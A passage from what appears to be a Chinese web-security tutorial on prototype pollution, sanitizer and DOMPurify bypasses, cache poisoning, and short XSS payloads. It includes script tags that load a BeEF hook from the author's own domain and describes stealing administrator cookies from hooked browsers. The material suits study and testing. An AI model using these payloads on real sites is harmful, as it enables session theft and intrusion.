admin&#x27;);&#125;</span><br></pre></td></tr></table></figure>\n<p>当前 user 没有 admin 的属性，但如果我们污染了 <code>Object.prototype</code>  和定义名为的属性 <code>admin</code> ，那么 <code>console.log</code>  将执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.admin = true;const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;); // this will execute&#125;</span><br></pre></td></tr></table></figure>\n<p>此漏洞的入口点通常是合并操作（即将一个对象的所有属性复制到另一个对象）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const obj1 = &#123; a: 1, b: 2 &#125;;</span><br><span class=\"line\">recursiveMerge(obj1, obj2); </span><br><span class=\"line\">递归合并的基本流程是：</span><br><span class=\"line\">1. 遍历 obj2 的所有属性并检查它们是否存在于`obj1`.</span><br><span class=\"line\">2. 如果存在属性，则对该属性执行合并操作。</span><br><span class=\"line\">3. 如果属性不存在，则将其从 复制`obj2`到`obj1`。</span><br></pre></td></tr></table></figure>\n<p>如果用户对要合并的对象有任何控制权，那么通常其中一个对象来自 <code>JSON.parse</code> . And <code>JSON.parse</code>  有点特别，因为它被视为 <code>__proto__</code> “普通” 属性，即没有作为原型访问器的特殊含义</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1024x219.png\" alt=\"img\"></p>\n<p>访问 <code>obj1.__proto__</code> 返回 <code>Object.prototype</code> （ <code>__proto__</code> 返回原型的特殊属性也是如此），同时 <code>obj2.__proto__</code> 包含 JSON 中给出的值，即： <code>123</code> . 这证明了 <code>__proto__</code> 属性的处理方式与 <code>JSON.parse</code>  普通 JavaScript 不同。</p>\n<p>所以现在想象一个 <code>recursiveMerge</code>  合并两个对象的函数：</p>\n<ul>\n<li><code>obj1=&#123;&#125;</code></li>\n<li><code>obj2=JSON.parse('&#123;&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;')</code></li>\n</ul>\n<ol>\n<li>遍历 <code>obj2</code> . 唯一的属性是 <code>__proto__</code> 。</li>\n<li>检查是否 <code>obj1.__proto__</code> 存在。确实如此。</li>\n<li>遍历 <code>obj2.__proto__</code> . 唯一的属性是 <code>x</code> 。</li>\n<li>赋值： <code>obj1.__proto__.x = obj2.__proto__.x</code> 。因为 <code>obj1.__proto__</code> 指向 <code>Object.prototype</code> ，则原型被污染。</li>\n</ol>\n<p>在许多流行的 JS 库中都发现了这种类型的错误，包括<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1MT0RBU0gtNDUwMjAy\"> lodash</span> 或<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL2Jsb2cvYWZ0ZXItdGhyZWUteWVhcnMtb2Ytc2lsZW5jZS1hLW5ldy1qcXVlcnktcHJvdG90eXBlLXBvbGx1dGlvbi12dWxuZXJhYmlsaXR5LWVtZXJnZXMtb25jZS1hZ2Fpbi8=\"> jQuery</span>。</p>\n<p>所有公开的利用原型污染的例子都集中在 NodeJS 上，其目标是实现远程代码执行。</p>\n<h3 id=\"通过原型链污染bypass-html-sanitizer\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-html-sanitizer\">#</a> 通过原型链污染 bypass HTML sanitizer</h3>\n<p>想象一下，我们有一个只允许 <code>&lt;b&gt;</code>  和 <code>&lt;h1&gt;</code>  标签的 sanitizer。如果我们用以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; &lt;i&gt;HTML&lt;/i&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>它应该将其清理为以下形式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; HTML</span><br></pre></td></tr></table></figure>\n<p>HTML sanitizer 需要维护允许的元素属性和元素列表。基本上，库通常采用以下两种方式之一来存储列表：</p>\n<p>该库可能有一个包含允许元素列表的数组，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = [&quot;h1&quot;, &quot;i&quot;, &quot;b&quot;, &quot;div&quot;]</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，他们只需调用 <code>ALLOWED_ELEMENTS.includes(element)</code> . 这种方法可以避免原型污染，因为我们不能扩展数组；也就是说，我们不能污染 <code>length</code>  属性，也不能污染已经存在的索引。即使使用 <code> Object.prototype.length = 10;Object.prototype[0] = 'test';</code> , 然后 <code>ALLOWED_ELEMENTS.length</code>  仍然返回 <code>4</code>  并且 <code>ALLOWED_ELEMENTS[0]</code>  仍然是 <code>&quot;h1&quot;</code> 。</p>\n<p>另一种解决方案是存储一个包含允许元素的对象，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = &#123; &quot;h1&quot;: true, &quot;i&quot;: true, &quot;b&quot;: true, &quot;div&quot; :true&#125;</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，库可能会检查 <code>ALLOWED_ELEMENTS[element]</code> . 这种方法很容易通过原型污染加以利用；因为如果我们通过以下方式污染原型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.SCRIPT = true;</span><br></pre></td></tr></table></figure>\n<p>然后 <code>ALLOWED_ELEMENTS[&quot;SCRIPT&quot;]</code>  返回 <code>true</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427192220087.png\" alt=\"image-20220427192220087\"></p>\n<h3 id=\"通过原型链污染bypass-dompurify\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-dompurify\">#</a> 通过原型链污染 bypass DOMPurify</h3>\n<p>与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png\" alt=\"img\"></p>\n<p>DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      /* Set configuration parameters */</span><br><span class=\"line\">ALLOWED_TAGS = &#x27;ALLOWED_TAGS&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;</span><br><span class=\"line\">ALLOWED_ATTR = &#x27;ALLOWED_ATTR&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;</span><br></pre></td></tr></table></figure>\n<p>在 JavaScript 中 <code>in</code> ，运算符遍历原型链。因此 <code>'ALLOWED_ATTR' in cfg</code> ，如果此属性存在于 <code>Object.prototype</code> .</p>\n<p>DOMPurify 默认允许使用 <code>&lt;img&gt;</code>  标签，因此该漏洞利用只需要 <code>ALLOWED_ATTR</code>  使用 <code>onerror</code>  和进行污染 <code>src</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png\" alt=\"img\"></p>\n<p>其他通过原型链污染 bypass xss 过滤框架不在叙述，可以到参考文献中查看</p>\n<h3 id=\"ctf案例原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#ctf案例原型链污染\">#</a> CTF 案例：原型链污染</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p>难度太大，就不班门弄斧了…</p>\n<h2 id=\"缓存投毒\"><a class=\"markdownIt-Anchor\" href=\"#缓存投毒\">#</a> 缓存投毒</h2>\n<p>Web 缓存位于用户和应用程序服务器之间，用于保存和提供某些响应的副本。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015170751343.png\" alt=\"image-20221015170751343\"></p>\n<p>缓存技术旨在通过减少延迟来加速页面加载，还可以减少应用程序服务器上的负载。可以使用 Varnish 或 CDN 设置网站的缓存</p>\n<p>每当缓存服务收到对资源的请求时，它需要确定它是否已经保存了这个指定资源的副本，并且可以使用该副本进行响应，或者是否需要将请求转发给应用程序服务器。</p>\n<p>确定两个请求是否正在尝试加载相同的资源可能是很棘手的问题；对请求进行逐字节匹配的做法是完全无效的，因为 HTTP 请求充满了无关紧要的数据，例如请求头中的 User-Agent 字段</p>\n<p>缓存使用缓存键的概念解决了这个问题 – 使用一些特定要素用于完全标识所请求的资源，但可能导致缓存系统错误认为两个缓存键相同但其他参数不同的请求是等效的，将返回错误的数据。</p>\n<p>Web 缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015171200570.png\" alt=\"image-20221015171200570\"></p>\n<p>非缓存键出现在错误的地方，可以来自于 HTTP 请求头，HTTP 响应，路由，DOM 等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427202534867.png\" alt=\"image-20220427202534867\"></p>\n<p>识别缓存键可以使用如下插件～：burpsuite param miner</p>\n<p>详细可以看这个文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">https://www.anquanke.com/post/id/156356</span></p>\n<p>对应的 burpsuite 也有相应的靶场</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmc=\">Web cache poisoning | Web Security Academy (portswigger.net)</span></p>\n<p>防御：</p>\n<p>针对缓存投毒的最强大防御办法就是禁用缓存。</p>\n<p>如果您对确定哪些内容是 “静态” 的足够确认，那么只对纯静态的响应进行缓存也是有效的。</p>\n<p>同样，避免从请求头和 cookie 中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的请求头。</p>\n<p>一旦在应用程序中识别出非缓存键的输入，理想的解决方案就是彻底禁用它们。</p>\n<p>最后，无论您的应用程序是否使用缓存技术，你的某些客户端可能在其末端都存在缓存，因此不应忽视 HTTP 请求头中的 XSS 等客户端漏洞。</p>\n<h2 id=\"奇技淫巧\"><a class=\"markdownIt-Anchor\" href=\"#奇技淫巧\">#</a> 奇技淫巧</h2>\n<h3 id=\"1通过特殊字符绕过或缩短playload和src长度\"><a class=\"markdownIt-Anchor\" href=\"#1通过特殊字符绕过或缩短playload和src长度\">#</a> 1. 通过特殊字符绕过或缩短 playload 和 src 长度</h3>\n<p>利用浏览器对 Unicode 兼容性构造 script 中短 src</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=//℡℠.㎺&gt;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS10ZWxzbS1kcTFoMDNiMzR3MHJmNjMzY2hobmR0NGZla2EucHc=\">浏览器可以解析为 telsm.pw</span>，但 length 只有 4 个字符</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=\">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s\">https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html</span></p>\n<p>ſ</p>\n<p>ß</p>\n<p>TEL</p>\n<p>SR</p>\n<p>PW</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png\" alt=\"img\"></p>\n<p>利用浏览器对 UNiocode 支持</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png\" alt=\"img\"></p>\n<h3 id=\"11-案例emersion-of-xss-with-20-characters-limitation\"><a class=\"markdownIt-Anchor\" href=\"#11-案例emersion-of-xss-with-20-characters-limitation\">#</a> 1.1 案例：emersion of XSS with 20 characters limitation</h3>\n<h3 id=\"1xss-platform\"><a class=\"markdownIt-Anchor\" href=\"#1xss-platform\">#</a> 1.Xss platform</h3>\n<h3 id=\"11beef-xss\"><a class=\"markdownIt-Anchor\" href=\"#11beef-xss\">#</a> 1.1beef-xss</h3>\n<p>安装： <code>apt-get install beef-xss</code></p>\n<p>注意事项：</p>\n<p>几种常见的安装报错：</p>\n<p>1. 更新 apt 源</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png\" alt=\"image-20220910205931724\"></p>\n<p>解决方法： <code>apt-get update </code>   <code>sudo apt-get upgrade</code></p>\n<p>2. 缺省依赖</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png\" alt=\"image-20220910210020518\"></p>\n<p>解决方法: <code>apt-get install libglib2.0-dev </code></p>\n<p>安装完之后在进行 <code>apt-get install beef-xss</code></p>\n<p>beef 默认路径： <code>http://127.0.0.1:3000/ui/panel</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png\" alt=\"image-20220910210358884\"></p>\n<p>使用 pkav 测试：</p>\n<p>使用系统提供的 payload</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png\" alt=\"image-20220910233217661\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png\" alt=\"image-20220910211111241\"></p>\n<p>此时再去 beef panel 查看</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png\" alt=\"image-20220910211138801\"></p>\n<p>说明此时已经上线，可以在 command 中找到命令执行：</p>\n<p>说明：</p>\n<ul>\n<li>绿色模块：表示模块适用当前用户，并且执行结果对用户不可见</li>\n<li>红色模块：表示模块不适用当前用户，有些红色模块也可以执行</li>\n<li>橙色模块：模块可用，但结果对用户可见</li>\n<li>灰色模块：模块为在目标浏览器上测试过</li>\n</ul>\n<p>最重要的是可以看到 cookies，如果对方是管理员登录，那么我们便可以使用管理员 cookie 进行登录</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png\" alt=\"image-20220910211534847\"></p>\n<h3 id=\"2xss-hunter\"><a class=\"markdownIt-Anchor\" href=\"#2xss-hunter\">#</a> 2.XSS-hunter</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3NodW50ZXIuY29tLw==\">https://xsshunter.com/</span></p>\n<p>1. 进行注册</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png\" alt=\"image-20220910232621209\"></p>\n<p>2. 注册完后系统会自动登录，在 XSS fires 页面，如果有已经上线的主机会在此显示，payloads 页面提供了一些 xsspayload</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png\" alt=\"image-20220910232730320\"></p>\n<p>3. 如果成功上线，会显示如下界面，full report 里面会有后台地址和 cookies</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png\" alt=\"image-20220910233046239\"></p>\n<h3 id=\"21-在centos上安装beef-xss\"><a class=\"markdownIt-Anchor\" href=\"#21-在centos上安装beef-xss\">#</a> 2.1 在 centos 上安装 beef-xss</h3>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY29tZG9kby9wLzU1MDY5OTYuaHRtbA==\">CentOS 安装 beEF 做 XSS 平台 - 海鸥博客 - 博客园 (cnblogs.com)</span></p>\n<p>但有些需要注意的点</p>\n<p>1. 上文中的启动 rvm 不一定是在 etc 下，是在你自己的安装目录下，启动完后使用 rvm 输出版本测试是否成功</p>\n<p>我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改 rvm 版本，是你安装得版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.rvm/archives</span><br><span class=\"line\">tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have</span><br></pre></td></tr></table></figure>\n<p>这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.rvm/archives/rvm-1.26.11/scripts/rvm</span><br></pre></td></tr></table></figure>\n<p>然后 rvm 命令就可以正常运行了</p>\n<p>2. 安装 ruby 时报错没有足够空间：找到安装 rvm 的目录的 /rvm/archives/rvm/scripts/functions/utility 文件，</p>\n<p>搜索 “df” 行，您将找到此代码将：</p>\n<p><code> __free_space=&quot;$( \\command \\df &quot;$1&quot; | __rvm_awk 'BEGIN&#123;x=4&#125; /Free/&#123;x=3&#125; $3==&quot;Avail&quot;&#123;x=3&#125; END&#123;print $x&#125;' )&quot;</code></p>\n<p>改为</p>\n<p><code>__free_space=&quot;999999&quot;</code></p>\n<p>同时为了防止 checksum 报错，需要加参数–verify downloads 2，这个参数不一定有用，建议采用第三条代替</p>\n<p>3. 安装 ruby 时可能会非常非常～慢，需要先更改 rvm 源，其实就和你更改 yum 源为 ali 一样的道理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ruby_url=https://cache.ruby-china.com/pub/ruby&quot; &gt; /usr/local/rvm/user/db</span><br><span class=\"line\">注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db</span><br><span class=\"line\">然后就可以安装 rvm install 2.7</span><br></pre></td></tr></table></figure>\n<p>4. 提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ERROR:  SSL verification error at depth 0: ok (0)</span><br><span class=\"line\">Error fetching https://ruby.taobao.org/:</span><br></pre></td></tr></table></figure>\n<p>更换 gem 源，参考链接<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nZW1zLnJ1YnktY2hpbmEuY29tLw==\"> RubyGems 镜像 - Ruby China (ruby-china.com)</span></p>\n<p>5. 下载 beef  <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuY29tL2thbGlsaW51eC9wYWNrYWdlcy9iZWVmLXhzcw==\">Kali Linux / Packages / beef-xss · GitLab</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JlZWZwcm9qZWN0L2JlZWY=\">GitHub - beefproject/beef: The Browser Exploitation Framework Project</span></p>\n<p>建议使用第二个</p>\n<p>注意：下载此版本 ruby 版本必须 &gt; 3.0.3</p>\n<p>6. 报错 <code>There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.</code></p>\n<p>sudo 给对应的文件夹递归加权限即可</p>\n<p>7. 报错 <code>in autodetect': Could not find a JavaScript runtime.</code></p>\n<p>安装 nodejs 即可  <code>yum install nodejs</code></p>\n<p>8. 安装 bundle install 时非常慢，可以更新 bundle 源</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br></pre></td></tr></table></figure>\n<p>9. 显示 <code>/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version': Your version of SQLite (3.7.17) is too old. Active Record supports SQLite &gt;= 3.8. (RuntimeError)</code></p>\n<p>解决方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br></pre></td></tr></table></figure>\n<p>10. 报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[14:15:27][!] ERROR: Default username and password in use!</span><br><span class=\"line\">[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml</span><br></pre></td></tr></table></figure>\n<p>解决方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim config.yaml   </span><br><span class=\"line\">更改默认密码</span><br></pre></td></tr></table></figure>\n<p>也可以参考一下这篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmVsaXh6aC9wLzgwODE2MjIuaHRtbA==\"> RVM 安装 Ruby - 大数据从业者 FelixZh - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xMmQzMjI2ZDgzZWU=\">安装 rvm, 升级 ruby。跳的坑，做个记录 - 简书 (jianshu.com)</span></p>\n<p>但我明显碰到了更多奇奇怪怪的问题</p>\n<p>总结：不要再 centos 上安装 beef 会变得不幸</p>\n<h3 id=\"2使用4540或者20个字符绕过xss长度限制\"><a class=\"markdownIt-Anchor\" href=\"#2使用4540或者20个字符绕过xss长度限制\">#</a> 2. 使用 45,40，或者 20 个字符绕过 xss 长度限制</h3>\n<p>下面使用 gallerycms 进行测试，原因是它采用 jQuery 框架，可以测试某些情况下的最短 payload</p>\n<h3 id=\"21gallerycms安装\"><a class=\"markdownIt-Anchor\" href=\"#21gallerycms安装\">#</a> 2.1gallerycms 安装</h3>\n<p>1. 报错解决方法：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png\" alt=\"image-20220911001606531\"></p>\n<p>1. 修改 \\application\\config\\database.php 中的数据库密码，并且创建对应数据库</p>\n<p>2. 切换 php 版本为 5.X，因为该 CMS 使用旧版的 CI 框架</p>\n<p>2. 随便注册，登录，此处的 Album Name 就是注入点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png\" alt=\"image-20220911001755992\"></p>\n<h3 id=\"22使用短域名绕过字符限制\"><a class=\"markdownIt-Anchor\" href=\"#22使用短域名绕过字符限制\">#</a> 2.2 使用短域名绕过字符限制</h3>\n<p>短域名定义：通过 Unicode 编码使 Unicode 中一个字符被浏览器解析为两个或三个字符，最典型的有如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ﬀ expands to `ff`</span><br><span class=\"line\">℠ expands to `sm`</span><br><span class=\"line\">㏛ expands to `sr`</span><br><span class=\"line\">ﬆ expands to `st`</span><br><span class=\"line\">㎭ expands to `rad`</span><br><span class=\"line\">℡ expands to `tel`</span><br></pre></td></tr></table></figure>\n<p>因此我们就可以使用 Unicode 编码来缩短域名长度</p>\n<p>因此我注册了一个域名 <code>radsm.co</code> , 使用 Unicode 表示为 <code>㎭℠.co</code> 。相比之前减少了三个字符</p>\n<p>最极限的情况是使用 <code>℡℠.㎺</code> , 注意这里 pw 其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了 pw。。。。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=\">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s\">https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html</span></p>\n<p>后来想起来不止这几个，其实极限域名甚至可以更短。。。</p>\n<h5 id=\"1没有禁止script标签的情况\"><a class=\"markdownIt-Anchor\" href=\"#1没有禁止script标签的情况\">#</a> 1. 没有禁止 script 标签的情况</h5>\n<p>使用 xsshunt 平台：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script/src=https://㎭℠.xss.ht&gt;   </span><br></pre></td></tr></table></figure>\n<p>此时该 payload 为 30 个字符</p>\n<p>使用 beef-xss 平台</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script/src=http://㎭℠.co:3000/hook.js&gt;</span><br></pre></td></tr></table></figure>\n<p>此时该 payload 为 30 个字符</p>\n<p>但注意：src 中不加 &quot;&quot; 也可以正常解析，同时不加协议也可以正常解析</p>\n<p>对于 xsshunter 平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到 xsshunter 的域名</p>\n<p>注意：国内的域名不支持重定向</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png\" alt=\"image-20220911004504679\"></p>\n<p>对于 beef-xss 平台，由于 hook.js 这个路径太占长度，我们可以将 hook.js 写到 index.html 中，并且将网站使用默认端口省掉：3000 这些字符</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png\" alt=\"image-20220911004816278\"></p>\n<p>此时我们的极限 payload 为 <code>&lt;script/src=//㎭℠.㎺&gt;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png\" alt=\"image-20220911005113131\"></p>\n<p>此时我们可以在 19 个长度内完成</p>\n<h5 id=\"2前端框架为jquery可以使用如下payload\"><a class=\"markdownIt-Anchor\" href=\"#2前端框架为jquery可以使用如下payload\">#</a> 2 前端框架为 jQuery，可以使用如下 payload：</h5>\n<p>不过滤 script 标签：</p>\n<p>注意此 payload 不能缺少 &quot;&quot; ，同样需要把 hook.js 放到 index.html 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png\" alt=\"image-20220911194433247\"></p>\n<p>过滤 script 标签</p>\n<p>如果没有过滤 svg 标签。那么此时的 payload 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 